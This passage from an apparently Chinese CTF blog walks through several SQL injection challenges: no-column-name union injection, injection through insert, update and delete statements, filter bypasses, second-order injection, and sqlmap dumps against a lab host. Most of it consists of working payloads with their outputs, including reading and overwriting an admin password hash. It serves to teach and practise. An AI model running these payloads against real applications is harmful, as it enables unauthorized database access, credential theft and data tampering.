库被过滤</strong>，使用这种方法获取列名。</p><p><strong>无列名注入原理</strong></p><p>无列名注入的原理其实很简单，就是联合查询<strong>创建虚拟数据</strong>。<strong>可以看作将我们不知道的列名进行取别名操作</strong>，在取别名的同时进行数据查询，所以查询字段数一定要相同，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p><h2 id="本地演示"><a href="#本地演示" class="headerlink" title="本地演示"></a>本地演示</h2><p>正常查表</p><p> select * from Gu0f3n;<br><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B903%E5%88%86.png" alt="image-20240806200233160"></p><p>联合查询表中数据</p><p>select 1,2,3 union select * from Gu0f3n;(我这里字段是三，具体情况具体分析)</p><p>很明显创建了虚拟数据（虚拟字段值123和虚拟表），虚拟表中列名变成了123。</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B904%E5%88%86.png" alt="image-20240806200442297"></p><p>很明显创建了虚拟数据（虚拟字段值123和虚拟表），虚拟表中列名变成了123。</p><p>只查一列的字段的值我们可以 yyy是自己命名的虚拟表表名，可以自定义这条sql语句在联合查询创建虚拟表xxx，虚拟列1,2,3的同时查询虚拟表第二列的数据。</p><p>select <code>2</code> from (select 1,2,3 union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B909%E5%88%86.png" alt="image-20240806200938012"></p><p>要查多个列的话</p><p>select <code>2</code> ,<code>3</code>from (select 1,2,3 union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240806201127902"></p><p>如果有时候把&#96;过滤了我们可以用as</p><p>select 1 as a,2 as b, 3 as c union select * from Gu0f3n;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B914%E5%88%86.png" alt="image-20240806201353981"></p><p>select b from (select 1 as a,2 as b,3 as c union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B915%E5%88%86.png" alt="image-20240806201450310"></p><h2 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h2><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240806201644950"></p><p>黑名单应该是这样的<code>&quot;/and|sleep|extractvalue|information|is|not|updataxml|order|rand|handler|flag|sleep|\~|\!|\@|\#|\\$|\%|\^|\+|\&amp;|\-|\ /i&quot;</code></p><p>判断类型</p><p>因为注释符号都过滤了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;|&#x27;1</span><br></pre></td></tr></table></figure><p>发现回显和id&#x3D;1一样确定是字符型</p><p>空格&#x2F;**&#x2F;绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;/**/group/**/by/**/3,&#x27;1</span><br></pre></td></tr></table></figure><p>发现字段为3</p><p>判断回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,3/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>这里where是限制条件 目的还是注释掉闭合</p><p>发现回显位置为3</p><p>爆库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>得到这些库名</p><p>ctf,ctftraining,ctftraining,ctftraining,mysql</p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>得到这些表名</p><p>ccctttfff,flag,news,users,gtid_slave_pos</p><p>上面说过 不能得到列名 我们直接爆值</p><p>还得自己一个个试</p><p>最终flag 在ctftraining.flag下面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,`6`/**/from/**/(select/**/6/**/union/**/select/**/*/**/from/**/ctftraining.flag)Gu0f3n/**/where&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A521%E7%82%B907%E5%88%86.png" alt="image-20240806210746263"></p><p>还有有一种闭合方式%00</p><p>其他都一样</p><h1 id="MoeCTF-2022-Sqlmap-boy"><a href="#MoeCTF-2022-Sqlmap-boy" class="headerlink" title="[MoeCTF 2022]Sqlmap_boy"></a>[MoeCTF 2022]Sqlmap_boy</h1><p>万能密码成功进入</p><p>admin” or 1&#x3D;1#</p><p>发现注入点 id 闭合方式为单引号字段为3</p><p>回显为为 2，3</p><p>当前库名为moectf</p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p>articles,flag,users</p><p>爆列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database()--+</span><br></pre></td></tr></table></figure><p>flAg</p><p>爆值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27; union select 1,group_concat(flAg),3 from flag--+</span><br></pre></td></tr></table></figure><p>NSSCTF{75b86f27-423b-418f-ac60-08815140a910}</p><h1 id="HUBUCTF-2022-新生赛-ezsql"><a href="#HUBUCTF-2022-新生赛-ezsql" class="headerlink" title="[HUBUCTF 2022 新生赛]ezsql"></a>[HUBUCTF 2022 新生赛]ezsql</h1><p>这题提示获得admin的密码</p><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>参考文章：<a href="https://blog.csdn.net/qq_35599248/article/details/122440184">https://blog.csdn.net/qq_35599248/article/details/122440184</a></p><p>我们常见的<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sql注入</a>一般都是基于select语句，但是在update，insert，delete也可以注入。</p><p>他们的原理都是当执行时遇到 (表达式1)(and&#x2F;or)(表达式2) ，这种形式的式子时，前后表达式前后都会执行，然后做逻辑运算，最后的结果要么0，要么1。</p><p>假如我们sql注入的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; AND 3666=3666 AND ′Gu0f3n&#x27;=&#x27;Gu0f3n</span><br></pre></td></tr></table></figure><p>SQL查询会变成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; AND 3666=3666 AND &#x27;Gu0f3n&#x27;=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure><ol><li><strong>id&#x3D;’1’</strong>:<ul><li>这个部分将 <code>id</code> 设为 <code>1</code>，并闭合了引号。此时，<code>id</code> 的值实际上为 <code>&#39;1&#39;</code>。</li></ul></li><li><strong>AND 3666&#x3D;3666</strong>:<ul><li>这是一个恒真条件，因为3666总是等于3666。这个条件保证了注入部分的合法性，并且在逻辑上不改变查询的结果。</li></ul></li><li><strong>AND ‘Gu0f3n’&#x3D;’Gu0f3n’</strong>:<ul><li>这是另一个恒真条件，因为<code>Gu0f3n</code>总是等于<code>Gu0f3n</code>。这进一步确保了查询的合法性。</li></ul></li></ol><h3 id="中间插入表达式的位"><a href="#中间插入表达式的位" class="headerlink" title="中间插入表达式的位"></a>中间插入表达式的位</h3><p>这种注入方法的关键在于引入两个恒真条件，使得查询语句在逻辑上始终为真。这种情况下，我们可以在中间的表达式位插入任意的SQL语句，而不会引起语法错误或逻辑错误。</p><h3 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h3><p>假设我们希望通过SQL注入来查询数据库的版本信息，构造如下的payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; AND 3362=3362 AND (SELECT version())=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure><p>这个查询会变成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; AND 3362=3362 AND (SELECT version())=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure><p>下面来说一下<a href="https://so.csdn.net/so/search?q=insert&spm=1001.2101.3001.7020">insert</a>，update，delete的注入。</p><h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>insert语句的格式一般为<br>insert into <teable_name> values (,,,…);<br>当我们发现后面插入值的<strong>某个位置我们可控</strong>时，就可以把那个位置改成多个逻辑连接词的形式，同时insert注入还可以帮助我们任意注册账号。因为插入语句要求我们插入位置的数据类型相同，所以我们要我们可控的位置的数据类型一般都是数值.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into Gu0f3n values(1 and if(1&gt;2,0,sleep(3)),&#x27;shell&#x27;,&#x27;Gu0f3n&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A509%E7%82%B950%E5%88%86.png" alt="image-20240807094926093"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into Gu0f3n values(1 and updatexml(1,(select concat(0x7e,version())),3),&#x27;shell&#x27;,&#x27;Gu0f3n&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A509%E7%82%B956%E5%88%86.png" alt="image-20240807095633287"></p><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>格式</p><p>update <table_name> set column &#x3D; where &lt;条件&gt;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A510%E7%82%B912%E5%88%86.png" alt="image-20240807101214936"></p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>delete from <table_name> where &lt;条件&gt;<br>原理还是和上面一样，只是这个要注意一下不要把数据库里面的内容删了，所以一定要保持最后逻辑表达式的结果为假。or连接词慎用。</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A510%E7%82%B914%E5%88%86.png" alt="image-20240807101426609"></p><h3 id="回到题目-1"><a href="#回到题目-1" class="headerlink" title="回到题目"></a>回到题目</h3><p>admin弱口令爆破不出</p><p>万能密码没试出来</p><p>扫目录发现源码泄露</p><p>发现update.php</p><p>存在sql注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query<span class="operator">=</span>$mysqli<span class="operator">-</span><span class="operator">&gt;</span>query(&quot;update users set age=$_POST[age],nickname=&#x27;$_POST[nickname]&#x27;,description=&#x27;$_POST[description]&#x27; where id=$_SESSION[id]&quot;);</span><br></pre></td></tr></table></figure><p>注入点在age这里</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3n&amp;age=-1,description=(select database())#&amp;description=ss&amp;token=294e68dc4639816cda6dea96ca92603d</span><br></pre></td></tr></table></figure><p>爆出库名</p><p>demo2</p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure><p>users</p><p>爆列</p><p>发现这里将单引号过滤了 </p><p>将users转16进制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=database())#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure><p>id,username,password,nickname,age,description</p><p>得到这些列</p><p>看到密码拿密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(password) users)#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure><p>MD5存储</p><p>3691308f2a4c2f6983f2880d32e29c84</p><p>更新所有密码(aaa)</p><p>nickname&#x3D;Gu0f3b&amp;age&#x3D;11,password&#x3D;0x3437626365356337346635383966343836376462643537653963613966383038#&amp;description&#x3D;sss&amp;token&#x3D;3ac68ca374a43cc099684f4353f5284d</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B957%E5%88%86.png" alt="image-20240807115708531"></p><p>给了段md5</p><p>解密发现是iamcool</p><p>重启靶机</p><p>登录admin&#x2F;iamcool</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B959%E5%88%86.png" alt="image-20240807115943261"></p><h1 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h1><p>过滤</p><p>hacker!!black_list is &#x2F;if|and|\s|#|–&#x2F;i 单引号闭合</p><p>%00绕过 空格&#x2F;**&#x2F;</p><p>字段一位</p><p>暴库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/database();%00</span><br></pre></td></tr></table></figure><p>test</p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database();%00</span><br></pre></td></tr></table></figure><p>string(10) “flag,users”</p><p>爆列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;;%00</span><br></pre></td></tr></table></figure><p>string(4) “flag”</p><p>爆值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(flag)/**/from/**/flag;%00</span><br></pre></td></tr></table></figure><p>string(63) “前有巨大宝箱,NSSCTF{629ea8c3-1d54-4eda-a425-dbb573cf61df}”</p><h1 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h1><p>注册登录进去</p><p>发现输进去的东西被转义</p><p>这个页面放弃</p><p>登录页面估计也不行</p><p>注册页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select database() # /123456</span><br></pre></td></tr></table></figure><p>闭合方式为’’</p><p>然后在登录发现爆库名</p><p>ctftraining</p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database() # </span><br></pre></td></tr></table></figure><p>flag,news,users</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database() # </span><br></pre></td></tr></table></figure><p>flag</p><p>爆值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(flag) from flag # </span><br></pre></td></tr></table></figure><p>NSSCTF{fe961858-8992-45d4-99a6-2b1427517f09}</p><h1 id="UUCTF-2022-新生赛-ezsql"><a href="#UUCTF-2022-新生赛-ezsql" class="headerlink" title="[UUCTF 2022 新生赛]ezsql"></a>[UUCTF 2022 新生赛]ezsql</h1><p>输入万能密码</p><p>admin‘) or 1&#x3D;1;#</p><p>发现被反转了了而且or被过滤了</p><p>&#x2F;&#x2F;<em>your sql:SELECT * FROM users WHERE passwd&#x3D;(‘’) AND username&#x3D;(‘#;1&#x3D;1 )���nimda’) LIMIT 0,1</em></p><p><a href="https://www.abcdtools.com/reverse">https://www.abcdtools.com/reverse</a></p><p>输入反转后的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;1=1 ro ) &#x27;nimda</span><br></pre></td></tr></table></figure><p>发现登录进去了</p><p>判断字段回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;2,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>两位 12</p><p>爆库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>UUCTF</p><p>or被过滤 爆表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat erehw selbat.amehcs_noitamrofni moorrf )(esabatad,)eman_elbat(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>flag,users</p><p>爆列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat dna &#x27;galf&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni moorrf )(esabatad,)eman_nmuloc(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>UUCTF</p><p>保值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;galf moorrf )(esabatad,)FTCUU(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;Your Login name:NSSCTF{53358f22-a9b8-4397-99bd-a381194cc0d2}<br>&#x2F;&#x2F;Your Password:UUCTF</p><h1 id="HNCTF-2022-WEEK4-fun-sql"><a href="#HNCTF-2022-WEEK4-fun-sql" class="headerlink" title="[HNCTF 2022 WEEK4]fun_sql"></a>[HNCTF 2022 WEEK4]fun_sql</h1><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i&quot;</span>,<span class="variable">$uname</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM ccctttfff WHERE uname=&#x27;<span class="subst">$uname</span>&#x27;;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$db</span>, <span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$db</span>);</span><br><span class="line">  <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>源码直接给出过滤的字符</p><p>1’’1注释闭合字符</p><p>暴力查字段 发现三段 都有回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,2,3&#x27;1</span><br></pre></td></tr></table></figure><p>暴库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,database(),3&#x27;1</span><br></pre></td></tr></table></figure><p>ctf</p><ul><li><p><strong><code>/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i</code></strong></p><p>这个正则表达式包含了多个关键词和符号，每个关键词或符号之间用 <code>|</code> 分隔，表示“或”关系。正则表达式中的每个部分分别匹配如下内容：</p><ol><li><strong><code>regexp</code></strong>: 匹配字符串 <code>regexp</code>。</li><li><strong><code>left</code></strong>: 匹配字符串 <code>left</code>。</li><li><strong><code>extractvalue</code></strong>: 匹配字符串 <code>extractvalue</code>。</li><li><strong><code>floor</code></strong>: 匹配字符串 <code>floor</code>。</li><li><strong><code>reverse</code></strong>: 匹配字符串 <code>reverse</code>。</li><li><strong><code>update</code></strong>: 匹配字符串 <code>update</code>。</li><li><strong><code>between</code></strong>: 匹配字符串 <code>between</code>。</li><li><strong><code>flag</code></strong>: 匹配字符串 <code>flag</code>。</li><li><strong><code>=</code></strong>: 匹配等号 <code>=</code>。</li><li><strong><code>&gt;</code></strong>: 匹配大于号 <code>&gt;</code>。</li><li><strong><code>&lt;</code></strong>: 匹配小于号 <code>&lt;</code>。</li><li><strong><code>and</code></strong>: 匹配字符串 <code>and</code>。</li><li><strong><code>\|</code></strong>: 匹配竖线符号 <code>|</code>。</li><li><strong><code>right</code></strong>: 匹配字符串 <code>right</code>。</li><li><strong><code>substr</code></strong>: 匹配字符串 <code>substr</code>。</li><li><strong><code>replace</code></strong>: 匹配字符串 <code>replace</code>。</li><li><strong><code>char</code></strong>: 匹配字符串 <code>char</code>。</li><li><strong><code>&amp;</code></strong>: 匹配符号 <code>&amp;</code>。</li><li><strong><code>\\$</code></strong>: 匹配美元符号 <code>$</code>，需要双反斜杠来转义。</li><li><strong><code>0x</code></strong>: 匹配十六进制前缀 <code>0x</code>。</li><li><strong><code>sleep</code></strong>: 匹配字符串 <code>sleep</code>。</li><li><strong><code>\#</code></strong>: 匹配井号 <code>#</code>。</li></ol></li><li><p><strong><code>/i</code></strong></p><p>这个模式修饰符表示不区分大小写匹配。</p></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>单拿出来</p><ul><li><code>if ($row[1] === $uname)</code>: 检查 <code>$row</code> 数组中索引为 <code>1</code> 的元素是否等于 <code>$uname</code>。</li><li><code>die($flag);</code>: 如果相等，则终止脚本执行并输出 <code>$flag</code> 的值。</li></ul><p>我们直接插入一段自定义的列进去然后让uname等于我们自定义的列即可</p><p>之前讲过的insert注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,database(),3;insert/**/into/**/ccctttfff/**/values(&#x27;ss&#x27;,&#x27;Gu0f3n&#x27;,&#x27;1&#x27;);&#x27;1</span><br></pre></td></tr></table></figure><p>之后让uname&#x3D;Gu0f3n</p><p>NSSCTF{f87847e6-6220-417c-9b7b-2db8d9b5e9fb}</p><h1 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h1><p>存在二次注入</p><p>首先随便创建一个账号进入修改密码</p><p>查看源码</p><p> “ update user set password&#x3D;’%s’ where username&#x3D;’%s’; ”</p><p>那么我们只要创建一个admin’–+就可以绕过闭合</p><p>之后修改自己想要的密码登录admin</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A516%E7%82%B945%E5%88%86.png" alt="image-20240807164508710"></p><p>查询就两个回显 </p><p>exist 和no user </p><p>说明能够执行但没回显，没报错</p><p>考虑盲注</p><p>sqlmap试试</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A516%E7%82%B958%E5%88%86.png" alt="image-20240807165800615"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>node4.anna.nssctf.cn:<span class="number">28285</span><span class="operator">/</span>query <span class="comment">--data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27;</span></span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; --tables</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B900%E5%88%86.png" alt="image-20240807165948914"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; --columns</span><br></pre></td></tr></table></figure><p>爆列</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B901%E5%88%86.png" alt="image-20240807170149812"></p><p>爆值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B903%E5%88%86.png" alt="image-20240807170351944"></p><p>NSSCTF{68025097-def3-4ea7-9dda-af4b16c6f1a4}</p><h1 id="NSSRound-3-Team-This1sMysql"><a href="#NSSRound-3-Team-This1sMysql" class="headerlink" title="[NSSRound#3 Team]This1sMysql"></a>[NSSRound#3 Team]This1sMysql</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var</span>)?(<span class="keyword">int</span>)<span class="variable">$val</span>:<span class="variable">$val</span>;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ 